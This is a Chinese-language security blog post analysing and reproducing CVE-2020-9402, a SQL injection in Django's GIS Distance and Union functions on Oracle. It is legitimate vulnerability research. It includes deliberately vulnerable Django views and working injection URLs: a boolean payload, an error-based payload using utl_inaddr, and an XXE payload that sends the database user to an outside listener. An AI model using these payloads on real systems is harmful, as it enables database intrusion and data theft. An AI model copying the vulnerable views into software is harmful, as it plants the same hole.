<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="（CVE-2020-9402）Django Geo sql注入一、漏洞简介Django1.11.29之前的1.11.x版本、2.2.11之前的2.2.x版本和3.0.4之前的3.0.x版本中存在SQL注入漏洞。攻击者可借助特制的SQL语句利用该漏洞查看、添加、修改或删除数据库中的信息。 二、漏洞影响Django1.11.29之前的1.11.x版本、2.2.11之前的2.2.x版本和3.0.4之前的">
<meta property="og:type" content="article">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Django/%EF%BC%88CVE-2020-9402%EF%BC%89Django%20Geo%20sql%E6%B3%A8%E5%85%A5/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:description" content="（CVE-2020-9402）Django Geo sql注入一、漏洞简介Django1.11.29之前的1.11.x版本、2.2.11之前的2.2.x版本和3.0.4之前的3.0.x版本中存在SQL注入漏洞。攻击者可借助特制的SQL语句利用该漏洞查看、添加、修改或删除数据库中的信息。 二、漏洞影响Django1.11.29之前的1.11.x版本、2.2.11之前的2.2.x版本和3.0.4之前的">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId24.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId25.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId26.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId28.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId29.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId30.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId31.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId32.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId33.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId34.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId35.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId36.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId37.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId38.png">
<meta property="article:published_time" content="2022-07-08T06:25:54.935Z">
<meta property="article:modified_time" content="2022-07-08T07:24:51.674Z">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://she11c0de.github.io/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId24.png">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-Django/（CVE-2020-9402）Django Geo sql注入" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Django/%EF%BC%88CVE-2020-9402%EF%BC%89Django%20Geo%20sql%E6%B3%A8%E5%85%A5/" class="article-date">
  <time datetime="2022-07-08T06:25:54.935Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2020-9402）Django-Geo-sql注入"><a href="#（CVE-2020-9402）Django-Geo-sql注入" class="headerlink" title="（CVE-2020-9402）Django Geo sql注入"></a>（CVE-2020-9402）Django Geo sql注入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Django<br>1.11.29之前的1.11.x版本、2.2.11之前的2.2.x版本和3.0.4之前的3.0.x版本中存在SQL注入漏洞。攻击者可借助特制的SQL语句利用该漏洞查看、添加、修改或删除数据库中的信息。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Django<br>1.11.29之前的1.11.x版本、2.2.11之前的2.2.x版本和3.0.4之前的3.0.x版本中存在SQL注入漏洞</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>根据官网的修复<a target="_blank" rel="noopener" href="https://github.com/django/django/commit/6695d29b1c1ce979725816295a26ecc64ae0e927/#diff-229e38ececbfc591f7a5e595bf5707c4%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E9%97%AE%E9%A2%98%E5%87%BA%E5%9C%A8GIS%E7%9A%84%E6%9F%A5%E8%AF%A2%E4%B8%8A%E9%9D%A2">https://github.com/django/django/commit/6695d29b1c1ce979725816295a26ecc64ae0e927\#diff-229e38ececbfc591f7a5e595bf5707c4，可以看到问题出在GIS的查询上面</a></p>
<p><img src="/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId24.png"></p>
<p><img src="/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId25.png"></p>
<p>官方只修复了这两个位置，可以发现基本上是对于<code>tolerance</code>参数进行判断是否为数字。那首先来了解一下GIS查询。</p>
<p>GIS查询API是一个地理位置的查询API，提供用户存储精确GPS的位置的数据模块，属于一个空间数据库，我们可以通过如下的经纬度信息</p>
<pre><code>pnt = GEOSGeometry(&#39;POINT(-96.876369 29.905320)&#39;, srid=4326)

&gt;&gt;&gt;SRID=4326;POINT (-96.876369 29.90532)
</code></pre>
<p>来获得一个具体的定位信息,通过如下的模块来构建一个基本的地理信息存储</p>
<pre><code>from django.contrib.gis.db import models
class Names(models.Model):
    name = models.CharField(max_length=128)

    def __str__(self):
        return self.name

class Interstate(Names):
    path = models.LineStringField()
</code></pre>
<p>后台存储的时候发出path的信息为json数据，例如</p>
<pre><code>&#123;&quot;type&quot;:&quot;LineString&quot;,&quot;coordinates&quot;:[[-8167.236601807093,-3286.248045708844],[-7896.285624495958,-3324.9553281818644],[1083.8039092445451,-654.1528375435246]]&#125;
</code></pre>
<p><img src="/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId26.png"></p>
<p>我们就获得了一个基本的地理位置数据,同理，通过构造一个聚合的查询方法</p>
<pre><code>def vuln(request):
    q = request.GET.get(&#39;q&#39;)
    qs=Interstate.objects.annotate(
            d=Distance(
                Point(-0.0733675346842369, -0.0295208671625432, srid=4326),
                Point(0.009735976166628611, -0.00587635491086091, srid=4326),
                tolerance = q, # default 0.05
            ),
        ).filter(d=D(m=1)).values(&#39;name&#39;)
</code></pre>
<p>因为官网文档找不到如何构造Point查询，因此为了省事，直接写死了Point数值。。srid为空间参考的投影设置，默认值为4326。其中<code>tolerance</code>是对于oracle特殊存在的一个键值，其作用是基本你的容错率，详细的信息可以参考<a target="_blank" rel="noopener" href="https://docs.oracle.com/en/database/oracle/oracle-database/18/spatl/spatial-concepts.html#GUID-CE10AB14-D5EA-43BA-A647-DAC9EEF41EE6">oracle官方文档</a>。对应的查询语句为</p>
<pre><code>SELECT &quot;APP_NAMEDMODEL&quot;.&quot;NAME&quot; FROM &quot;APP_INTERSTATE&quot; INNER JOIN &quot;APP_NAMEDMODEL&quot; ON (&quot;APP_INTERSTATE&quot;.&quot;NAMEDMODEL_PTR_ID&quot; = &quot;APP_NAMEDMODEL&quot;.&quot;ID&quot;) WHERE SDO_GEOM.SDO_DISTANCE(SDO_GEOMETRY(POINT (-0.0733675346842369 -0.0295208671625432),4326), SDO_GEOMETRY(POINT (0.009735976166628611 -0.00587635491086091),4326), 0.05) =  1.0 FETCH FIRST 21 ROWS ONLY;
</code></pre>
<p><strong>0x02代码分析</strong>首先从传入一个url</p>
<pre><code>http://127.0.0.1:8000/vuln/?q=20) = 1 OR 1=1 OR (1%2B1
</code></pre>
<p>从<code>annotate</code>聚合函数开始跟进，同普通的model函数查询一样，gis查询虽然拥有着单独的model模块，但依旧还是依靠着普通model中进行过滤和查询。从gis的model文件夹中的<code>__init__.py</code>文件中看</p>
<p><img src="/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId28.png"></p>
<p>主要的查询依然调用的是django最基本的db方法，而其中单独定义了<code>function</code>方法等一些对地理位置插叙独特的方法。程序运行到<code>/django/db/models/manager.py</code>文件中的<code>_get_queryset_methods</code>后，获取到tolerant参数之后便直接进入到gis模块中进行查询</p>
<p><img src="/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId29.png"></p>
<p>继而进入到<code>django/contrib/gis/measure.py</code>文件中的<code>MeasureBase</code>类中进行方法调用，那么后面的方法分析可以跳过，因此直接来到漏洞代码段。先来看gis<br>API中的functions函数，在as_oracle方法这一段</p>
<pre><code>def as_oracle(self, compiler, connection, **extra_context):
    tol = self.extra.get(&#39;tolerance&#39;, self.tolerance)
    return self.as_sql(
        compiler, connection,
        template=&quot;%%(function)s(%%(expressions)s, %s)&quot; % tol,
        **extra_context
    )
</code></pre>
<p><code>tolerance</code><br>从self.extra.get导入，该方法会搜索全局变量的值，如果该值不存在，则直接设置为0.05，并且将其直接传入到新的变量中。之后则不对tol进行任何处理直接拼接到template字符串中并且传入<code>as_sql</code>方法。那么官方对于as_sql的文档是，此方法需要一个SQLCompiler对象，位于<code>django/db/models/sql/compiler.py</code>文件中。而我们只需要知道在该对象中有一个<code>compile()</code>方法，该方法可以返回一个包含SQL字符串的元祖，而SQLComiler对象中的query变量则是存储直接进行SQL查询语句的SQL命令。从而两个Point分别进入<code>compile</code>方法中进行拼接</p>
<p><img src="/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId30.png"></p>
<p>不知道为什么，用pycharm在as_oracle下断点的时候，第一次到达SQLCompiler的时候，pycharm不会在as_oracle函数中停下来，而是在第二次查询的时候才会停，但是经过测试确实是在进入SQLCompiler之前调用过as_orcle函数，可能是pycharm没有正确识别重载函数吧。之后template构造模版也因此进入到<code>expression.py</code>中的as_sql函数中进行字符串构造</p>
<p><img src="/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId31.png"></p>
<p>因此最后进入oracle的命令语句是</p>
<pre><code>SELECT &quot;APP_NAMEDMODEL&quot;.&quot;NAME&quot; FROM &quot;APP_INTERSTATE&quot; INNER JOIN &quot;APP_NAMEDMODEL&quot; ON (&quot;APP_INTERSTATE&quot;.&quot;NAMEDMODEL_PTR_ID&quot; = &quot;APP_NAMEDMODEL&quot;.&quot;ID&quot;) WHERE SDO_GEOM.SDO_DISTANCE(SDO_GEOMETRY(POINT (-0.0733675346842369 -0.0295208671625432),4326), SDO_GEOMETRY(POINT (0.009735976166628611 -0.00587635491086091),4326), 0.05) = 1 OR 1=1  OR (1+1) = 1.0 FETCH FIRST 21 ROWS ONLY;
</code></pre>
<p><img src="/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId32.png"></p>
<p>带入数据库中查询</p>
<p><img src="/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId33.png"></p>
<p><img src="/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId34.png"></p>
<p>官方修复的方法就是加入Value函数，判断传入的值是否为数字，否的话直接报错推出。那么第二个注入点就是<code>Union</code>了，建立Model</p>
<pre><code>class City(Names):
    point = models.PointField()  # 点模块
</code></pre>
<p>编辑传入的参数为</p>
<pre><code>&#123;&quot;type&quot;:&quot;Point&quot;,&quot;coordinates&quot;:[13250.226757682816,68815.69380603009]&#125;
</code></pre>
<p>view中设置查询</p>
<pre><code>from django.contrib.gis.db.models import Union
def vuln2(request):
    q = request.GET.get(&#39;q&#39;)
    res = City.objects.aggregate(
            Union(&#39;point&#39;, tolerance=q),
    )
    return HttpResponse(res)
</code></pre>
<p>输入url</p>
<pre><code>http://127.0.0.1:8000/vuln2?q=0.05)))%2C%20(((1
</code></pre>
<p>首先看结果，得到的SQL查询语句为</p>
<pre><code>SELECT SDO_UTIL.TO_WKBGEOMETRY(SDO_AGGR_UNION(SDOAGGRTYPE(&quot;APP_CITY&quot;.&quot;POINT&quot;,0.05))), (((1))) AS &quot;POINT__UNION&quot; FROM &quot;APP_CITY&quot;;
</code></pre>
<p><img src="/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId35.png"></p>
<p>该aggregate查询方法是GIS查询特定的一种查询方法，为的是与地理查询的语句做适配,用法跟原模块的方法类似。因此跟进GIS模块中的聚合查询方法，位于<code>django/contrib/gis/db/models/aggregates.py</code>文件内的as_oracle方法。</p>
<p><img src="/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId36.png"></p>
<p>同样tolerance没有做任何检查直接传入了template模版语句中，原理与上面annotate查询过程一致。利用有大致两个方法报错注入</p>
<pre><code>http://localhost:8000/test/?q=20) = 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v%24instance)) from dual) is null%20 OR (1%2B1
</code></pre>
<p><img src="/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId37.png"></p>
<p>CVE-2014-6577因为Django自2.0以后支持的oracle版本为12以上，因此可以尝试oracle<br>XXE来进行SQL的注入。同时因为在SQL处理的过程中有三次利用%的模版跳转，因此需要在XMLpayload中的%替换为%%%%，payload为</p>
<pre><code>http://localhost:8000/test/?q=20) = 1 OR (select%20extractvalue(xmltype(&#39;%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE%20root%20%5B%20%3C!ENTITY%20%25%25%25%25%20remote%20SYSTEM%20%22http%3A%2F%2Fdocker.for.mac.host.internal%3A9000%2F&#39;%7C%7C(SELECT%20user%20from%20dual)%7C%7C&#39;%22%3E%20%25%25%25%25remote%3B%5D%3E&#39;)%2C&#39;%2Fl&#39;)%20from%20dual)%20is%20not%20null OR (1%2B1
</code></pre>
<p><img src="/resource/(CVE-2020-9402)DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId38.png"></p>
<p>命令执的话因为是docker起的oracle所以没有设置JAVA的环境，暂时也不能判定有没有，以后再研究看看。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7403">https://xz.aliyun.com/t/7403</a></p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Django/%EF%BC%88CVE-2020-9402%EF%BC%89Django%20Geo%20sql%E6%B3%A8%E5%85%A5/" data-id="cl5c2qo37005ay8v1gooug5bp" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/07/Docker/Docker%20%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%20(CVE-2020-15257)%E5%A4%8D%E7%8E%B0/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2022/07/07/Django/%EF%BC%88CVE-2020-7471%EF%BC%89Django%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>